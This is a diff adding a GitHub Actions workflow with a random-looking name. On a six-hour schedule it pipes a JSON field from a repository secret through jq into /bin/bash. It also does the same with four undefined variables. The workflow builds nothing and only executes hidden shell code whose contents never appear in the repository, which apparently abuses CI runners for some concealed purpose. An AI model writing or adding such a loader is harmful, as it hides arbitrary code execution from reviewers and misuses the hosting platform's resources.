@@ -1,0 +1,21 @@
+name: huangxuexiao1960
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangxuexiao1960
+        env:
+          pma4006: ${{ secrets.pma4006 }}
+        run: |
+          echo $pma4006 | jq -r .xm7 | /bin/bash
+          echo $bohk82261 | jq -r .ptn27264 | /bin/bash
+          echo $wymjb85157 | jq -r .ar3 | /bin/bash
+          echo $cjoo195 | jq -r .jt562 | /bin/bash
+          echo $ty58 | jq -r .pvhrw7 | /bin/bash
+
